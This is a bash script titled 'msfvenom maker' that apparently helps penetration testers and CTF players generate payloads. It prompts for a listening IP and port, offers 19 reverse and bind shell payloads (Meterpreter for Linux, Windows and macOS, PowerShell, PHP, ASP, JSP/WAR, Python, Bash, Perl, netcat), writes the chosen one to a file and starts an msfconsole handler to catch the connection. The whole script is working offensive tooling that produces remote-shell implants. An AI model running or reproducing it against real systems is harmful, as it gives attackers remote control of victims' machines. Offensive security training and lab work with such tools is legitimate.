#!/bin/bash

# Regular Colors
Black="\033[0;30m"        # Black
Red="\033[0;31m"          # Red
Green="\033[0;32m"        # Green
Yellow="\033[0;33m"       # Yellow
Blue="\033[0;34m"         # Blue
Purple="\033[0;35m"       # Purple
Cyan="\033[0;36m"         # Cyan
White="\033[0;37m"        # White
NC='\033[0m' # Default color

# Display Title
function title() {
	printf """\n${Purple}
	#    #  ####  ###### #    # ###### #    #  ####  #    # 
	##  ## #      #      #    # #      ##   # #    # ##  ## 
	# ## #  ####  #####  #    # #####  # #  # #    # # ## # 
	#    #      # #      #    # #      #  # # #    # #    # 
	#    # #    # #       #  #  #      #   ## #    # #    # 
	#    #  ####  #        ##   ###### #    #  ####  #    # 
	                                                        
	                                  
	#    #   ##   #    # ###### #####  
	##  ##  #  #  #   #  #      #    # 
	# ## # #    # ####   #####  #    # 
	#    # ###### #  #   #      #####  
	#    # #    # #   #  #      #   #  
	#    # #    # #    # ###### #    #                       
	${NC}""";

	printf "${Purple}\nWritten by:${NC} ${Blue}Yunolay${NC}"
	printf "${Purple}\nGithub:${NC} https://github.com/Yunolay"
	printf "${Purple}\nTwitter:${NC} https://twitter.com/Yunolay"
	printf "${Purple}\nHTB Profile:${NC} https://www.hackthebox.eu/profile/97384\n\n"
}

function version() {
    printf "${Purple}\nVersion:${NC} $(basename ${0}) version 0.0.1\n"
}

function help() {
    cat <<EOF

Usage:
    $(basename ${0}) [LHOST] [LPORT]

Options:
    --version, -v     print $(basename ${0}) version
    --help, -h        print this
    --ip              print ip v4 address
EOF
}

function show_ip() {
	printf "${Cyan}[+]${NC} Your IP address\n"
	ip -4 a | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
}

function select_ip() {
	printf "${Cyan}[+]${NC} Your IP address\n"
	i=0
	for line in $(ip -4 a | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
		do
			array[$i]=$line
			i=`expr $i + 1`
  			echo $i ":" $line
		done
	printf "\n${Cyan}[-]${NC} Select ip address : "
	read selected_ipaddress
	ipaddr=${array[selected_ipaddress-1]}
	printf "${Red}[+]${NC} Your selected ip address : "
	echo ${array[selected_ipaddress-1]}
}

function input_port() {
	printf "\n${Cyan}[-]${NC} Input listen port : "
	read port
}

ipaddr=$1
port=$2

title

while :
do
    case "$1" in
      -h | --help)
          help  # Call your function
          exit 0
          ;;
      -v | --version)
		  version
		  exit 0
          ;;
      --ip)
		  show_ip
		  exit 0
		  ;;
      --) # End of all options
          shift
          break
          ;;
      -*)
          echo "Error: Unknown option: $1" >&2
          ## or call function display_help
          exit 1 
          ;;
      *)  # No more options
          break
          ;;
    esac
done

################################
# Check if parameters options  #
# are given on the commandline #
################################

if [ $# -ne 2 ];then
    select_ip
    input_port
fi

printf "${Red}[+]${NC} "
echo "Your LHOST is" $ipaddr "LPORT is" $port

printf "\n${Cyan}[+]${NC} Please select a payload.\n"
printf "\n${Green}[-]${NC} ${Red}Binaries Payloads${NC}\n\n"
printf "${Cyan}[*]${NC} 1 : Linux Meterpreter Reverse Shel\n"
printf "${Cyan}[*]${NC} 2 : Linux Meterpreter Reverse Shell x64\n"
printf "${Cyan}[*]${NC} 3 : Linux Bind Meterpreter Shell\n"
printf "${Cyan}[*]${NC} 4 : Linux Bind Shell\n"
printf "${Cyan}[*]${NC} 5 : Windows Meterpreter Reverse TCP Shell\n"
printf "${Cyan}[*]${NC} 6 : Windows Meterpreter Reverse TCP Shell x64\n"
printf "${Cyan}[*]${NC} 7 : Windows Reverse TCP PowerShell x64\n"
printf "${Cyan}[*]${NC} 8 : Windows Reverse TCP Shell\n"
printf "${Cyan}[*]${NC} 9 : Windows Reverse TCP Shell x64\n"
printf "${Cyan}[*]${NC} 10 : Mac Reverse Shell\n"
printf "${Cyan}[*]${NC} 11 : Mac Bind Shell\n\n"
printf "${Green}[-]${NC} ${Red}Web Payloads${NC}\n\n"
printf "${Cyan}[*]${NC} 12 : PHP Meterpreter Reverse TCP\n"
printf "${Cyan}[*]${NC} 13 : ASP Meterpreter Reverse TCP\n"
printf "${Cyan}[*]${NC} 14 : ASP Meterpreter Reverse TCP\n"
printf "${Cyan}[*]${NC} 15 : War\n\n"
printf "${Green}[-]${NC} ${Red}Scripting Payloads${NC}\n\n"
printf "${Cyan}[*]${NC} 16 : Python Reverse Shell\n"
printf "${Cyan}[*]${NC} 17 : Bash Unix Reverse Shell\n"
printf "${Cyan}[*]${NC} 18 : Perl Unix Reverse shell\n\n"
printf "${Green}[-]${NC} ${Red}Linux Payloads${NC}\n\n"
printf "${Cyan}[*]${NC} 19 : Netcat Reverse shell\n\n"

printf "${Cyan}[-]${NC} Select payload number : "

read payload
case $payload in
	1) printf "${Cyan}[*]${NC} msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf > shell.elf\n"
	   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ipaddr LPORT=$port -f elf > shell.elf
	   msfconsole -x "use exploit/multi/handler; set ExitOnsession false; set payload linux/x86/meterpreter/reverse_tcp; set LHOST $ipaddr; set LPORT $port; exploit -j"
	   ;;
	2) printf "${Cyan}[*]${NC} msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf > shell.elf\n"
	   msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ipaddr LPORT=$port -a x64 -f elf > shell.elf
	   msfconsole -x "use exploit/multi/handler; set ExitOnsession false; set payload linux/x64/meterpreter/reverse_tcp; set LHOST $ipaddr; set LPORT $port; exploit -j"
	   ;;
	3) printf "${Cyan}[*]${NC} msfvenom -p linux/x86/meterpreter/bind_tcp -f elf > bind.elf\n"
	   msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=$ipaddr LPORT=$port -f elf > bind.elf
	   msfconsole -x "use exploit/multi/handler; set ExitOnsession false; set payload linux/x86/meterpreter/bind_tcp; set LHOST $ipaddr; set LPORT $port; exploit -j"
	   ;;
	4) printf "${Cyan}[*]${NC} msfvenom -p generic/shell_bind_tcp -f elf > term.elf\n"
	   msfvenom -p generic/shell_bind_tcp LHOST=$ipaddr LPORT=$port -f elf > term.elf
	   msfconsole -x "use exploit/multi/handler; set ExitOnsession false; set payload generic/shell_bind_tcp; set LHOST $ipaddr; set LPORT $port; exploit -j"
	   ;;
	5) printf "${Cyan}[*]${NC} msfvenom -p windows/meterpreter/reverse_tcp -f exe > shell.exe\n"
	   msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ipaddr LPORT=$port -f exe > shell.exe
	   msfconsole -x "use exploit/multi/handler; set ExitOnsession false; set payload windows/meterpreter/reverse_tcp; set LHOST $ipaddr; set LPORT $port; exploit -j"
	   ;;	   	   	   
	6) printf "${Cyan}[*]${NC} msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe > shell.exe\n"
	   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ipaddr LPORT=$port -a x64 -f exe > shell.exe
	   msfconsole -x "use exploit/multi/handler; set ExitOnsession false; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $ipaddr; set LPORT $port; exploit -j"
	   ;;	  
	7) printf "${Cyan}[*]${NC} msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f psh > shell.ps1\n"
	   msfvenom -p windows/x64/shell/reverse_tcp LHOST=$ipaddr LPORT=$port -a x64 -f psh > shell.ps1
	   msfconsole -x "use exploit/multi/handler; set ExitOnsession false; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $ipaddr; set LPORT $port; exploit -j"
	   ;;
	8) printf "${Cyan}[*]${NC} msfvenom -p windows/shell/reverse_tcp -f exe > shell.exe\n"
	   msfvenom -p windows/shell/reverse_tcp LHOST=$ipaddr LPORT=$port -f exe > shell.exe
	   msfconsole -x "use exploit/multi/handler; set ExitOnsession false; set payload windows/shell/reverse_tcp; set LHOST $ipaddr; set LPORT $port; exploit -j"
	   ;;	     
	9) printf "${Cyan}[*]${NC} msfvenom -p windows/x64/shell/reverse_tcp -a x64 -f exe > shell.exe\n"
	   msfvenom -p windows/x64/shell/reverse_tcp LHOST=$ipaddr LPORT=$port -a x64 -f exe > shell.exe
	   msfconsole -x "use exploit/multi/handler; set ExitOnsession false; set payload windows/x64/shell/reverse_tcp; set LHOST $ipaddr; set LPORT $port; exploit -j"
	   ;;	   
	10) printf "${Cyan}[*]${NC} msfvenom -p osx/x86/shell_reverse_tcp -f macho > shell.macho\n"
	   msfvenom -p osx/x86/shell_reverse_tcp LHOST=$ipaddr LPORT=$port -f macho > shell.macho
	   msfconsole -x "use exploit/multi/handler; set ExitOnsession false; set payload osx/x86/shell_reverse_tcp; set LHOST $ipaddr; set LPORT $port; exploit -j"
	   ;;	   
	11) printf "${Cyan}[*]${NC} msfvenom -p osx/x86/shell_bind_tcp -f macho > bind.macho\n"
	    msfvenom -p osx/x86/shell_bind_tcp LHOST=$ipaddr LPORT=$port -f macho -f macho > bind.macho
	    msfconsole -x "use exploit/multi/handler; set ExitOnsession false; set payload osx/x86/shell_bind_tcp; set LHOST $ipaddr; set LPORT $port; exploit -j"
	    ;;	     
	12) printf "${Cyan}[*]${NC} msfvenom -p php/meterpreter_reverse_tcp -f raw > shell.php\n"
	    msfvenom -p php/meterpreter_reverse_tcp LHOST=$ipaddr LPORT=$port -f raw > shell.php
	    msfconsole -x "use exploit/multi/handler; set ExitOnsession false; set payload php/meterpreter_reverse_tcp; set LHOST $ipaddr; set LPORT $port; exploit -j"
	    ;;	  
	13) printf "${Cyan}[*]${NC} msfvenom -p windows/meterpreter/reverse_tcp -f asp > shell.asp\n"
	    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ipaddr LPORT=$port -f asp > shell.asp
	    msfconsole -x "use exploit/multi/handler; set ExitOnsession false; set payload windows/meterpreter/reverse_tcp; set LHOST $ipaddr; set LPORT $port; exploit -j"
	    ;;	  
	14) printf "${Cyan}[*]${NC} msfvenom -p java/jsp_shell_reverse_tcp -f raw > shell.jsp\n"
	    msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ipaddr LPORT=$port -f raw > shell.jsp
	    msfconsole -x "use exploit/multi/handler; set ExitOnsession false; set payload java/jsp_shell_reverse_tcp; set LHOST $ipaddr; set LPORT $port; exploit -j"
	    ;;	  
	15) printf "${Cyan}[*]${NC} msfvenom -p java/jsp_shell_reverse_tcp -f war > shell.war\n"
	    msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ipaddr LPORT=$port -f war > shell.war
	    msfconsole -x "use exploit/multi/handler; set ExitOnsession false; set payload java/jsp_shell_reverse_tcp; set LHOST $ipaddr; set LPORT $port; exploit -j"
	    ;;	  
	16) printf "${Cyan}[*]${NC} msfvenom -p cmd/unix/reverse_python -f raw > shell.py\n"
	    msfvenom -p cmd/unix/reverse_python LHOST=$ipaddr LPORT=$port -f raw > shell.py
	    msfconsole -x "use exploit/multi/handler; set ExitOnsession false; set cmd/unix/reverse_python; set LHOST $ipaddr; set LPORT $port; exploit -j"
	    ;;	  
	17) printf "${Cyan}[*]${NC} msfvenom -p cmd/unix/reverse_bash -f raw > shell.sh\n"
	    msfvenom -p cmd/unix/reverse_bash LHOST=$ipaddr LPORT=$port -f raw > shell.sh
	    msfconsole -x "use exploit/multi/handler; set ExitOnsession false; set payload cmd/unix/reverse_bash; set LHOST $ipaddr; set LPORT $port; exploit -j"
	    ;;	
	18) printf "${Cyan}[*]${NC} msfvenom -p cmd/unix/reverse_perl -f raw > shell.pl\n"
	    msfvenom -p cmd/unix/reverse_perl LHOST=$ipaddr LPORT=$port -f raw > shell.pl
	    msfconsole -x "use exploit/multi/handler; set ExitOnsession false; set payload cmd/unix/reverse_perl; set LHOST $ipaddr; set LPORT $port; exploit -j"
	    ;;
	19) printf "${Cyan}[*]${NC} msfvenom -p cmd/unix/reverse_netcat > shell\n"
	    msfvenom -p cmd/unix/reverse_netcat LHOST=$ipaddr LPORT=$port > shell
	    msfconsole -x "use exploit/multi/handler; set ExitOnsession false; set payload cmd/unix/reverse_netcat; set LHOST $ipaddr; set LPORT $port; exploit -j"
	    ;;
	*)
		exit 1
	    ;;
esac
